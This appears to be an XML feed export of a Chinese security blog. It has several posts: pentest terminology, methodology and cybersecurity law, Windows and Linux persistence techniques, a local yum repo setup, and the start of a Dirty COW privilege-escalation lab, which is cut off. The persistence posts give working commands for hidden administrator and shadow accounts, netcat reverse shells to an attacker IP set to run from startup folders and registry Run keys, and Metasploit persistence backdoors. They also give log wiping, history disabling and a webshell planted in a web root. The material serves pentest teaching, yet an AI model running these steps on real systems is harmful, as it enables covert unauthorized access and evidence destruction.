        <content type="html"><![CDATA[<h2 id="一：术语介绍"><a href="#一：术语介绍" class="headerlink" title="一：术语介绍"></a>一：术语介绍</h2><blockquote><p>每个行业都有业界名词，EXP都不知道是啥？</p></blockquote><ul><li><p>病毒：是在计算机程序中插入的破坏计算机功能或者数据的代码，能影响计算机使用，能自我复制的一组计算机指令或者程序代码；</p></li><li><p>木马：是比较流行的病毒文件，与一般的病毒不同，它不会自我繁殖，也并不“刻意”地去感染其他文件，它通过将自身伪装吸引用户下载执行，向施种木马者提供打开被种主机的门户，使施种者可以任意毁坏、窃取被种者的文件，甚至远程操控被种主机；</p></li><li><p>肉鸡：指电脑中了木马，或者留了后门，可以被远程操控的机器，现在许多人把有WEBSHELL 权限的机器也叫肉鸡；</p></li><li><p>抓鸡：利用使用大量的程序的漏洞，使用自动化方式获取肉鸡的行为；</p></li><li><p>挖矿：是将一段时间内比特币系统中发生的交易进行确认，并记录在区块链上形成新区块的过程；</p></li><li><p>HTTP/HTTPS：定义Web客户端如何从Web服务器请求Web页面,以及服务器如何把Web页面传送给客户端；</p></li><li><p>MD5：一种被广泛使用的密码散列函数,属于不可逆加密；</p></li><li><p>CMS：Content Management System的缩写，内容管理系统；</p></li><li><p>框架：代码框架 比如CMS是已经装修好的房子 框架就是毛坯房；</p></li><li><p>漏洞：硬件、软件、协议等可利用安全缺陷，可能被攻击者利用，对数据进行篡改，控制等；</p></li><li><p>一句话木马：通过向服务端提交一句简短的代码，配合本地客户端实现Webshell功能的木马；</p></li><li><p>Webshell:通过Web入侵后留下的后门工具，可以据此对网站服务进行一定程度的控制；</p></li><li><p>提权：操作系统低权限的账户将自己提升为管理员权限使用的过程；</p></li><li><p>跳板：使用肉鸡IP来实施攻击其他目标，以便更好的隐藏自己的身份信息；</p></li><li><p>旁站：即同服务器下的网站入侵，入侵之后可以通过提权跨目录等手段拿到目标网站的权限；</p></li><li><p>C段：即同C段下服务器入侵。如目标IP为192.168.1.1入侵192.168.1.*的任意一台机器，然后利用一些黑客工具嗅探获取在网络上传输的各种信息；</p></li><li><p>撞库：是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，批量登陆其他网站后，得到可以登录的用户。</p></li><li><p>暴库：通过一些技术手段或者程序漏洞得到数据库的地址，并将数据非法下载到本地。</p></li><li><p>Poc：能证明漏洞存在的代码；</p></li><li><p>Exp：漏洞利用 一般都是demo工具 ；</p></li><li><p>Bug：指系统功能与预期不一致的代码缺陷；</p></li><li><p>Waf：WEB应用防护系统，也称之为网站应用级入侵防御系统；</p></li><li><p>Payload：攻击载荷，被送到目标机器执行的整段代码；</p></li><li><p>0day：未公开的漏洞 仅少数人知道；</p></li><li><p>1day：刚公开的漏洞官方发布了补丁，但是网上还有很多未打补丁的漏洞；</p></li><li><p>Nday：漏洞发布了很久还是没有修复的漏洞；</p></li><li><p>Shellcode：是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。</p></li><li><p>APT：高级可持续性攻击，是指组织（特别是政府）或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的供给形式（极强的隐蔽性、潜伏期长，持续性强、目标性强）</p></li></ul><h3 id="黑客挑战"><a href="#黑客挑战" class="headerlink" title="黑客挑战"></a>黑客挑战</h3><blockquote><p>能否将渗透术语介绍中的名词（CMS）所用的应用做详细的资产列表？</p></blockquote><h2 id="二：渗透测试流程"><a href="#二：渗透测试流程" class="headerlink" title="二：渗透测试流程"></a>二：渗透测试流程</h2><h4 id="什么是渗透测试？"><a href="#什么是渗透测试？" class="headerlink" title="什么是渗透测试？"></a>什么是渗透测试？</h4><blockquote><p>渗透测试就是通过模拟真实黑客的攻击手段来对目标系统进行一些列的评估</p></blockquote><h4 id="什么是等保测评？"><a href="#什么是等保测评？" class="headerlink" title="什么是等保测评？"></a>什么是等保测评？</h4><blockquote><p>全称是信息安全等级保护测评，是经公安部认证的具有资质的测评机构，依据国家信息安全等级保护规范规定，受有关单位委托，按照有关管理规范和技术标准，对信息系统安全等级保护状况进行检测评估的活动。</p><ul><li>安全技术测评：包括物理安全、网络安全、主机系统安全、应用安全和数据安全等五个层面上的安全控制测评。</li><li>安全管理测评：包括安全管理机构、安全管理制度、人员安全管理、系统建设管理和系统运维管理等五个方面的安全控制评。</li></ul></blockquote><h4 id="什么是风险评估？"><a href="#什么是风险评估？" class="headerlink" title="什么是风险评估？"></a>什么是风险评估？</h4><blockquote><p>风险评估是对信息资产（即某事件或事物所具有的信息集）所面临的威胁、存在的弱点、造成的影响，以及三者综合作用所带来风险的可能性的评估。</p></blockquote><h4 id="三者区别"><a href="#三者区别" class="headerlink" title="三者区别"></a>三者区别</h4><table><thead><tr><th align="center">名词</th><th align="left">执行目的</th><th align="left">参照标准</th></tr></thead><tbody><tr><td align="center">渗透测试</td><td align="left">评估网络/系统/应用三者组合使用下的安全状况</td><td align="left">PTES</td></tr><tr><td align="center">风险评估</td><td align="left">以PDCA循环持续推进风险管理为目的</td><td align="left">ISO27001</td></tr><tr><td align="center">等保测评</td><td align="left">是否符合等级保护要求为目的</td><td align="left">GA 388-2002</td></tr></tbody></table><h4 id="渗透测试类型"><a href="#渗透测试类型" class="headerlink" title="渗透测试类型"></a>渗透测试类型</h4><blockquote><ul><li><p>黑盒测试:又称为功能测试，渗透者完全处于对系统一无所知的状态，通常这类型测试，最初的信息获取来自于DNS、Web、Email及各种公开对外的服务器。</p></li><li><p>白盒测试：也称为结构测试，与黑箱测试恰恰相反，测试者可以通过正常渠道向被测单位取得各种资料，包括网络拓扑、员工资料甚至网站或其它程序的代码片段，也能够与单位的其它员工进行面对面的沟通。这类测试的目的是模拟企业内部雇员的越权操作。</p></li><li><p>灰盒测试：是介于白盒测试与黑盒测试之间的一种测试，通常情况下，接受渗透测试的单位网络管理部门会收到通知：在某些时段进行测试。因此能够监测网络中出现的变化。但灰盒测试被测单位也仅有极少数人知晓测试的存在，因此能够有效地检验单位中的信息安全事件监控、响应、恢复做得是否到位。</p></li></ul></blockquote><h4 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h4><blockquote><p>要对一个目标进行渗透测试，首先必须确保安全测试遵循了渗透测试执行标准（Penetration Testing Execution Standard, PTES）如果对渗透测试流程不了解可以在以下网站中学习渗透测试和安全分析的部分内容。</p></blockquote><p><img src="https://s3.ax1x.com/2021/01/20/sWcASO.png"></p><ul><li><a href="http://www.pentest-standard.org/index.php/Main_Page">国外渗透测试执行标准</a></li></ul><h5 id="1：确定目标"><a href="#1：确定目标" class="headerlink" title="1：确定目标"></a>1：确定目标</h5><table><thead><tr><th>渗透目标</th><th>常见应用</th></tr></thead><tbody><tr><td>操作系统</td><td>Linux主机/Windows主机</td></tr><tr><td>数据库系统</td><td>SQL Server/MySQL/Oracle/DB2/PostgreSQL/….</td></tr><tr><td>应用系统</td><td>FTP/DNS/DHCP/WEB/RDP/….</td></tr><tr><td>网络设备</td><td>防火墙/入侵检测系统/交换机/路由器</td></tr></tbody></table><ul><li><p>风险规避</p><blockquote><p>明确渗透测试范围;<br>测试之前对重要数据进行备份;<br>不要进行DDos/CC攻击，不破坏数据;<br>可以对原始系统生成镜像环境，然后对镜像环境进行测试;<br>任何测试执行前必须和客户进行沟通，以免引来不必要的麻烦;</p></blockquote></li></ul><h5 id="2：信息收集"><a href="#2：信息收集" class="headerlink" title="2：信息收集"></a>2：信息收集</h5><table><thead><tr><th>收集信息</th><th>应用场景</th></tr></thead><tbody><tr><td>真实IP地址</td><td>确定网站的真实IP地址，才能挖掘出更多有用的信息</td></tr><tr><td>子域名信息</td><td>如果发现不了网站的管理界面，不妨提前收集好子域名信息</td></tr><tr><td>whois信息</td><td>确定网站是否合法？要爆破管理用户登录？鱼叉式网络钓鱼攻击？</td></tr><tr><td>指纹信息</td><td>操作系统/数据库/CMS管理系统？</td></tr><tr><td>网站敏感文件</td><td>Robots文件/文件上传页面/网站备份文件/管理员登录……</td></tr><tr><td>端口开放信息</td><td>21/22/25/80/443/1433/1521/3306/3389/5000/5432/</td></tr><tr><td>旁站/C段扫描</td><td>一台服务器多台网站？同一网段服务器？</td></tr></tbody></table><ul><li>思考：信息收集对渗透测试的重要程度？</li></ul><h4 id="3：漏洞探测"><a href="#3：漏洞探测" class="headerlink" title="3：漏洞探测"></a>3：漏洞探测</h4><table><thead><tr><th>漏洞名称</th><th>目标获取</th></tr></thead><tbody><tr><td>SQL Injection</td><td>数据库信息..</td></tr><tr><td>Cross site scripting</td><td>Cookie信息…</td></tr><tr><td>Cross site request forgery</td><td>Cookie信息…</td></tr><tr><td>File Include</td><td>脚本木马…</td></tr><tr><td>File Upload</td><td>后门上传…</td></tr><tr><td>Command execution</td><td>系统命令执行…</td></tr><tr><td>Code execution</td><td>脚本代码执行…</td></tr><tr><td>Code Injection</td><td>获取内网信息…</td></tr><tr><td>brute force</td><td>猜解用户密码…</td></tr><tr><td>Struts2</td><td>获取用户权限…</td></tr></tbody></table><h4 id="4：漏洞利用"><a href="#4：漏洞利用" class="headerlink" title="4：漏洞利用"></a>4：漏洞利用</h4><blockquote><p>当我们探测到了该网站存在漏洞之后，我们就要对该漏洞进行利用了。不同的漏洞有不同的利用工具，很多时候，通过一个漏洞我们很难拿到网站的webshell，我们往往需要结合几个漏洞来拿webshell。常用的漏洞利用工具如下：</p></blockquote><table><thead><tr><th>常见漏洞</th><th>漏洞利用工具</th></tr></thead><tbody><tr><td>SQL注入</td><td>SQLMap …..</td></tr><tr><td>XSS跨站</td><td>XSS-Beef …..</td></tr><tr><td>抓包改包</td><td>BurpSuite，Fiddler，Wireshark，Winsock…..</td></tr><tr><td>加密解密</td><td>Hackbar …..</td></tr><tr><td>暴力破解</td><td>Hydra Medusa…..</td></tr></tbody></table><h4 id="5：权限提升"><a href="#5：权限提升" class="headerlink" title="5：权限提升"></a>5：权限提升</h4><blockquote><p>至此已经拿到了webshell也就是获取网站的管理权限，这一步就已经开始了后渗透测试的篇章<br>顾名思义，权限提升在这里是指将我们的普通用户权限提升到Administrator或者Root权限，常见的提权工具如下：</p></blockquote><ol><li><p>Windows提权</p><blockquote><p><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a><br><a href="https://github.com/lyshark/Windows-exploits">https://github.com/lyshark/Windows-exploits</a><br><a href="https://github.com/klsfct/getshell">https://github.com/klsfct/getshell</a><br><a href="https://github.com/ianxtianxt/win-exp-">https://github.com/ianxtianxt/win-exp-</a></p></blockquote></li><li><p>Linux提权</p><blockquote><p><a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p></blockquote></li></ol><h4 id="6：内网渗透"><a href="#6：内网渗透" class="headerlink" title="6：内网渗透"></a>6：内网渗透</h4><blockquote><p>如果我们还想进一步的探测内网主机的信息的话，我们就需要进行内网转发了。我们是不能直接和内网的主机通信的，所以我们就需要借助获取到的webshell网站的服务器和内网主机进行通信。</p></blockquote><table><thead><tr><th>转发方式</th><th>转发工具</th></tr></thead><tbody><tr><td>端口转发</td><td>LCX/PortMap/Nc</td></tr><tr><td>流量转发</td><td>EW/Frp/reGeorg/sSocks/proxychains/</td></tr></tbody></table><ul><li><p>内网渗透</p><p>​    —&gt; 域环境</p><p>​    —&gt;非域环境</p></li></ul><h4 id="7：痕迹清理"><a href="#7：痕迹清理" class="headerlink" title="7：痕迹清理"></a>7：痕迹清理</h4><blockquote><p>完全清理入侵痕迹？主要是增加管理员发现入侵者的时间成本和人力成本。只要管理员想查，无论怎么清除，还是能查到的。其主要目的还是要以隐藏入侵者身份为主，最好的手段是在渗透前挂上代理，然后在渗透后痕迹清除。</p></blockquote><ul><li><p>Windows系统</p><blockquote><p>系统日志文件:del %WINDR% .log /a/s/q/f<br>web日志文件：access.log error.log</p></blockquote></li><li><p>Linux系统</p><blockquote><p>历史命令 export HISTFILE=/dev/null export HISTSIZE=0<br>系统日志文件：rm -rf /var/log/*.log<br>web日志文件:.access_log error_log</p></blockquote></li></ul><p><img src="https://s3.ax1x.com/2021/01/20/sWh3pq.png"></p><ul><li>思考：怎样将入侵痕迹完全清除？</li></ul><h4 id="8：撰写报告"><a href="#8：撰写报告" class="headerlink" title="8：撰写报告"></a>8：撰写报告</h4><blockquote><p>在完成了渗透测试之后，我们就需要对这次渗透测试撰写渗透测试报告了。一个好的渗透测试报告至关重要,首先你需要明确漏洞名称以及漏洞原理。其次要注明参与人员，测试时间，内网外网在报告中具体阐述漏洞是如何产生的，如何利用的。最后应该给出详细的解决方案。</p></blockquote><table><thead><tr><th>包含内容</th><th>解析</th></tr></thead><tbody><tr><td>封面</td><td>测试公司的名称、标志以及客户的名称应该突出显示。</td></tr><tr><td>内容提要</td><td>像短篇小说一样的内容提要，内容要限制在一页纸以内</td></tr><tr><td>漏洞总结</td><td>可以使用花哨的图形（表格或图表），清晰明了漏洞列表</td></tr><tr><td>团队信息</td><td>渗透测试人员名字/联系方式</td></tr><tr><td>工具列表</td><td>渗透测试工具要包括版本和功能的简要描述</td></tr><tr><td>工作范围</td><td>应事先已经同意，可测试的目标范围</td></tr><tr><td>报告主体</td><td>主体:如何发现和利用以及修补漏洞，细节信息</td></tr></tbody></table><h2 id="三：技术及行业发展"><a href="#三：技术及行业发展" class="headerlink" title="三：技术及行业发展"></a>三：技术及行业发展</h2><blockquote><p>有需求才有业务</p></blockquote><h3 id="黑客技术发展趋势"><a href="#黑客技术发展趋势" class="headerlink" title="黑客技术发展趋势"></a>黑客技术发展趋势</h3><p><img src="https://s3.ax1x.com/2021/01/20/sW4r5j.png"></p><ul><li><a href="https://portswigger.net/research/top-10-web-hacking-techniques-of-2019">2019年10大黑客技术</a></li></ul><h3 id="技术层面的黑客等级"><a href="#技术层面的黑客等级" class="headerlink" title="技术层面的黑客等级"></a>技术层面的黑客等级</h3><table><thead><tr><th>等级划分</th><th>各级现状</th></tr></thead><tbody><tr><td>Level 1</td><td>愣头青【百万人】:会使用安全工具，只能简单扫描、破译密码</td></tr><tr><td>Level 2</td><td>系统管理员【上万人】:善用安全工具，特别熟悉系统及网络</td></tr><tr><td>Level 3</td><td>大公司开发人员或核心安全公司大牛【几千人】:对操作系统特别熟悉,开发代码</td></tr><tr><td>Level 4</td><td>挖掘并利用漏洞【几百人】:自己能找漏洞并写exp利用漏洞的；对系统挖洞的协议测试</td></tr><tr><td>Level 5</td><td>高水平【少于百人】：防御和构建系统的人</td></tr><tr><td>Level 6</td><td>精英级【几十人到十几人】：对操作系统的理解很深入</td></tr><tr><td>Level 7</td><td>大牛牛【寥寥无几】：马克·扎克伯格、艾伯特·爱因斯坦等改变世界的人</td></tr></tbody></table><h3 id="我认为的黑客等级"><a href="#我认为的黑客等级" class="headerlink" title="我认为的黑客等级"></a>我认为的黑客等级</h3><table><thead><tr><th align="center">月收益</th><th align="center">项目</th></tr></thead><tbody><tr><td align="center">80W–</td><td align="center">DDOS攻击？</td></tr><tr><td align="center">40W-80W</td><td align="center">勒索病毒？挖矿木马？</td></tr><tr><td align="center">20W-40W</td><td align="center">0day挖掘？外挂制作？</td></tr><tr><td align="center">10W-20W</td><td align="center">SRC/博彩/资金盘/股票盘/…非法站</td></tr></tbody></table><ul><li>友情提示：赚钱的项目都写到刑法里了，切勿知法犯法 </li></ul><h3 id="薪资水平"><a href="#薪资水平" class="headerlink" title="薪资水平"></a>薪资水平</h3><ul><li><a href="http://www.gsqi.net/gongzi/26622/">网路安全/月薪收入</a></li></ul><h3 id="行业发展"><a href="#行业发展" class="headerlink" title="行业发展"></a>行业发展</h3><ul><li><a href="https://mp.ofweek.com/security/a056714263077">2020年中国网络安全行业市场规模及发展前景分析</a></li></ul><h2 id="四-《网络安全法》"><a href="#四-《网络安全法》" class="headerlink" title="四:《网络安全法》"></a>四:《网络安全法》</h2><blockquote><p>“没有规矩，不成方圆”</p></blockquote><h4 id="《网络安全法》"><a href="#《网络安全法》" class="headerlink" title="《网络安全法》"></a>《网络安全法》</h4><blockquote><p>2016年11月7日第二十届全国人民代表大会常务委员会第二十四次通过《中华人民共和国网络安全法》，自2017年6月1日施行；</p></blockquote><h4 id="六方面亮点"><a href="#六方面亮点" class="headerlink" title="六方面亮点"></a>六方面亮点</h4><ol><li>明确了网络空间主权的原则。</li><li>明确了网络产品和服务提供者的安全义务。</li><li>明确了网络运营者的安全义务。</li><li>进一步完善了个人信息保护规则。</li><li>建立了关键信息基础设施安全保护制度。</li><li>确立了关键信息机出设施重要数据跨境传输的规则。</li></ol><h4 id="《网络安全法》内容"><a href="#《网络安全法》内容" class="headerlink" title="《网络安全法》内容"></a>《网络安全法》内容</h4><p><img src="https://s3.ax1x.com/2021/01/20/sWTPzR.png"></p><p><img src="https://s3.ax1x.com/2021/01/20/sWTAL6.png"></p><p><img src="https://s3.ax1x.com/2021/01/20/sWTuJH.png"></p><ul><li>《网络安全法》百度云盘分享：链接：<a href="https://pan.baidu.com/s/110b9hYwIoyC0AH_GXksD7g">https://pan.baidu.com/s/110b9hYwIoyC0AH_GXksD7g</a> 提取码：laos </li><li>持续更新中…</li></ul>]]></content>
      
      
      <categories>
          
          <category> WEB渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows提权之权限维持</title>
      <link href="2021/01/19/Windows%E6%8F%90%E6%9D%83%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
      <url>2021/01/19/Windows%E6%8F%90%E6%9D%83%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<h2 id="影子账号创建"><a href="#影子账号创建" class="headerlink" title="影子账号创建"></a>影子账号创建</h2><h3 id="创建普通账号"><a href="#创建普通账号" class="headerlink" title="创建普通账号"></a>创建普通账号</h3><blockquote><p>net user laosec 123admiN@ /add                  #创建普通账号laosec密码为123admiN@<br>net localgroup administrators laosec /add   #将普通账号laosec添加进administrators组</p></blockquote><h3 id="创建隐藏账号"><a href="#创建隐藏账号" class="headerlink" title="创建隐藏账号"></a>创建隐藏账号</h3><blockquote><p>net user laosec$ 123admiN@ /add                #创建隐藏账号laosec$密码为123admiN@(计算机管理可见)<br>net localgroup administrators laosec$ /add #将隐藏账号laosec$添加到administrators组中</p></blockquote><h3 id="创建影子账号"><a href="#创建影子账号" class="headerlink" title="创建影子账号"></a>创建影子账号</h3><h5 id="步骤一：打开注册表"><a href="#步骤一：打开注册表" class="headerlink" title="步骤一：打开注册表"></a>步骤一：打开注册表</h5><blockquote><p>WIN+R–&gt;regedit  #注册表编辑器命令<br>HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/<br>#遇到没有权限问题对HKEY_LOCAL_MACHINE/SAM/SAM右键-&gt;权限赋予当前用户administrator的具有完全控制和读取权限</p></blockquote><h5 id="步骤二：修改隐藏账号"><a href="#步骤二：修改隐藏账号" class="headerlink" title="步骤二：修改隐藏账号"></a>步骤二：修改隐藏账号</h5><blockquote><p>在Users目录下有00000XXX开头的文件还有Names<br>找到Names文件夹下的administrator单击，可以看到右侧的类型，其类型的值便对应着上面00000XXX<br>选中与administrator所对应的00000XXX在右侧双击F键值，在弹出窗口中将值内容全部复制    </p><p>#此值要给予要创建的影子账号的F键值中<br>在Names中找到要修改账户的类型值，找到其对应的00000XXX，并将刚才复制的内容覆盖掉其影子账户的F中的值</p></blockquote><blockquote><p>导出Names下的影子账户为1.reg<br>导出Users下影子账户对应的00000XXX为2.reg</p></blockquote><h5 id="步骤三：删除隐藏账号"><a href="#步骤三：删除隐藏账号" class="headerlink" title="步骤三：删除隐藏账号"></a>步骤三：删除隐藏账号</h5><blockquote><p>net user laosec$ /del        #删除隐藏账号laosec$</p></blockquote><h5 id="步骤四：创建隐藏账号"><a href="#步骤四：创建隐藏账号" class="headerlink" title="步骤四：创建隐藏账号"></a>步骤四：创建隐藏账号</h5><blockquote><p>将1.reg导入到注册表中<br>将2.reg导入到注册表中</p></blockquote><h5 id="步骤五：注销登录验证"><a href="#步骤五：注销登录验证" class="headerlink" title="步骤五：注销登录验证"></a>步骤五：注销登录验证</h5><p><a href="https://imgchr.com/i/sR624K"><img src="https://s3.ax1x.com/2021/01/20/sR624K.png"></a></p><h2 id="NC自动反弹"><a href="#NC自动反弹" class="headerlink" title="NC自动反弹"></a>NC自动反弹</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><blockquote><p>通过上传NC并配置注册表或开机自启动程序-&gt;重启服务器来获取到目标及其的CMD Shell</p><blockquote><ul><li>攻击者与受害者网络能够互通</li><li>攻击者VPS必须时刻监听相对应的端口</li></ul></blockquote></blockquote><h4 id="NC常规测试"><a href="#NC常规测试" class="headerlink" title="NC常规测试"></a>NC常规测试</h4><blockquote><p>nc -lvvp port              #攻击者VPS操作 侦听本地port<br>nc -t -e cmd.exe ip port   #受害者操作    正向连接到攻击者的VPS </p></blockquote><h4 id="1-自启动目录"><a href="#1-自启动目录" class="headerlink" title="1. 自启动目录"></a>1. 自启动目录</h4><blockquote><p>在受害者主机中进入到开机自启动目录下<br>C:\Documents and Settings\Administrator\「开始」菜单\程序\启动<br>创建sys.bat内容为<br>start /b nc -t -e cmd.exe 192.168.31.132 4444<br>在攻击者主机开启侦听<br>重启受害者主机，等待shell反弹</p></blockquote><h4 id="2-注册表启动"><a href="#2-注册表启动" class="headerlink" title="2. 注册表启动"></a>2. 注册表启动</h4><blockquote><p>reg add “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run” /v “sysone” /t REG_SZ /d “C:sys.bat” /f</p></blockquote><blockquote><p>参数说明：<br>/v 所选项之下要添加的值名<br>   /t RegKey 数据类型 如果忽略，则采用 REG_SZ<br>   /d 要分配给添加的注册表 ValueName 的数据<br>   /f 不用提示就强行改写现有注册表项<br>在攻击者主机开启侦听<br>重启受害者主机，等待shell反弹</p></blockquote><h4 id="结果验证"><a href="#结果验证" class="headerlink" title="结果验证"></a>结果验证</h4><h2 id="MSF权限维持"><a href="#MSF权限维持" class="headerlink" title="MSF权限维持"></a>MSF权限维持</h2><h3 id="反向链接：Persistence模块"><a href="#反向链接：Persistence模块" class="headerlink" title="反向链接：Persistence模块"></a>反向链接：Persistence模块</h3><h4 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h4><blockquote><p>一个vbs后门写入了开机启动项但是容易被发现!</p></blockquote><blockquote><p>run persistence -U -i 10 -p 4444 -r 192.168.34.132</p></blockquote><blockquote><p>参数解释：</p><p>-U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。推荐使用该参数；<br>-i：  设置反向连接间隔时间，单位为秒；<br>-p：设置反向连接的端口号；<br>-r： 设置反向连接的ip地址；</p></blockquote><h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><blockquote><p>use exploit/multi /handler</p><p>set PAYLOAD windows/meterpreter/reverse_tcp</p><p>set LHOST</p><p>set LPORT</p><p>exploit</p><p>meterpreter&gt;run persistence -U -i 10 -p 4444 -r 192.168.34.132</p></blockquote><h3 id="正向链接：Metsvc模块"><a href="#正向链接：Metsvc模块" class="headerlink" title="正向链接：Metsvc模块"></a>正向链接：Metsvc模块</h3><h4 id="简单介绍-1"><a href="#简单介绍-1" class="headerlink" title="简单介绍"></a>简单介绍</h4><blockquote><p>metsvc后渗透攻击模块其实就是将Meterpreter以系统服务的形式安装到目标主机，它会上传三个文件：</p><ul><li><p>metsvc.dll</p></li><li><p>metsvc-service.exe</p></li><li><p>metsvc.exe</p></li></ul></blockquote><h4 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h4><blockquote><p>use exploit/multi /handler</p><p>set PAYLOAD windows/metsvc_bind_tcp   </p><p>set RHOST     #设置要连接的远程主机</p><p>set LPORT      #设置本地端口即：31337</p><p>exploit</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 后渗透专题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权之权限维持</title>
      <link href="2021/01/19/Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
      <url>2021/01/19/Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<h2 id="常规权限维持"><a href="#常规权限维持" class="headerlink" title="常规权限维持"></a>常规权限维持</h2><h3 id="创建后门账号"><a href="#创建后门账号" class="headerlink" title="创建后门账号"></a>创建后门账号</h3><blockquote><p>useradd -p  `openssl passwd -1 -salt ‘salt’ 123456` guest</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 后渗透专题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RHCSA之软件包管理</title>
      <link href="2021/01/18/RHCSA%E4%B9%8B%E8%BD%AF%E4%BB%B6%E5%8C%85%E7%AE%A1%E7%90%86/"/>
      <url>2021/01/18/RHCSA%E4%B9%8B%E8%BD%AF%E4%BB%B6%E5%8C%85%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="源码编译安装"><a href="#源码编译安装" class="headerlink" title="源码编译安装"></a>源码编译安装</h2><h2 id="RPM包安装"><a href="#RPM包安装" class="headerlink" title="RPM包安装"></a>RPM包安装</h2><h2 id="包管理器安装"><a href="#包管理器安装" class="headerlink" title="包管理器安装"></a>包管理器安装</h2><h3 id="本地YUM源搭建"><a href="#本地YUM源搭建" class="headerlink" title="本地YUM源搭建"></a>本地YUM源搭建</h3><blockquote><ol><li><p>将光盘塞入光驱</p></li><li><p>mkdir /iso                  #创建进行文件挂载目录</p></li><li><p>mount /dev/sr0 /iso   #挂载镜像文件到/iso</p></li><li><p>cd /etc/yum.repos.d/ #进入到YUM配置目录</p></li><li><p>rm -rf *                      #删除所有的配置文件</p></li><li><p>vi repo.repo              #创建并编辑新的配置</p><blockquote><p>[Centos_iso]          #仓库描述</p><p>name = info           #对软件源的描述</p><p>baseurl=file:///iso   #镜像挂载位置</p><p>enable = 1             #是否启用此配置 0代表禁用 1代表启用</p><p>gpgchek = 0          #是否检测软件包签名</p></blockquote></li><li><p>yum clear all           #清除之前的YUM源信息</p></li><li><p>yum repolist            #列出YUM的信息</p></li><li><p>yum -y install gcc    #安装GCC编译程序</p></li><li><p>vi /etc/rc.d/rc.local</p><blockquote><p>mount /dev/sr0 /iso         #在最后一行添加</p></blockquote></li><li><p>chmod 755 /etc/rc.d/rc.local   #系统开机时自动挂载此脚本</p></li><li><p>reboot     #重启操作系统并验证</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 服务器运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权之内核提权</title>
      <link href="2021/01/18/Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/"/>
      <url>2021/01/18/Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="一：CVE-2016-5195-脏牛"><a href="#一：CVE-2016-5195-脏牛" class="headerlink" title="一：CVE-2016-5195(脏牛)"></a>一：CVE-2016-5195(脏牛)</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><blockquote><p>Linux内核在处理内存写时拷贝（Copy-on-Write）时存在条件竞争漏洞，导致可以破坏私有只读内存映射。一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致提权漏洞。<a href="https://www.exploit-db.com/exploits/40847"> 利用源码</a></p></blockquote><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><blockquote><p>低权限用户可以利用该漏洞修改只读内存，进而执行任意代码获取 root权限！</p></blockquote><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><blockquote><p>Linux 内核：2.6.22 &lt; 3.9 (x86/x64)</p></blockquote><h3 id="实验1-Centos-6"><a href="#实验1-Centos-6" class="headerlink" title="实验1-Centos 6~"></a>实验1-Centos 6~</h3><h3 id="步骤一：搭建实验环境"><a href="#步骤一：搭建实验环境" class="headerlink" title="步骤一：搭建实验环境"></a>步骤一：搭建实验环境</h3><blockquote><p>[root@localhost ~]#yum -y install httpd php      //安装http与php</p><p>[root@localhost ~]#cd /etc/init.d                //进入</p><p>[root@localhost ~]#./httpd start                 //启动http服务</p><p>[root@localhost ~]#service iptables stop         //关闭Iptables</p><p>[root@localhost ~]#echo ‘一句话木马’ &gt; /var/www/html/ma.php</p></blockquote><h4 id="步骤二：信息收集"><a href="#步骤二：信息收集" class="headerlink" title="步骤二：信息收集"></a>步骤二：信息收集</h4><blockquote><p>[/var/www/html/]$ id<br>uid=48(apache) gid=48(apache) groups=48(apache) context=unconfined_u:system_r:httpd_t:s0            //普通用户权限</p><p>[/var/www/html/]$ uname -r<br>2.6.32-220.el6.x86_64                              //符合提权条件，即：&gt;=2.6.22</p></blockquote><h4 id="步骤三：上传并编译-C文件"><a href="#步骤三：上传并编译-C文件" class="headerlink" title="步骤三：上传并编译.C文件"></a>步骤三：上传并编译.C文件</h4><blockquote><p> [/tmp/]$ gcc -pthread dirty.c -o dirty -lcrypt    </p><p> //使用gcc对dirty.c进行编译 -o生成可执行文件为dirty -l参数制定编译的时候使用crypt库</p></blockquote><blockquote><p>注意：上传文件位置一定具有可读可写可执行也就是777</p></blockquote><h4 id="步骤四：运行提权程序"><a 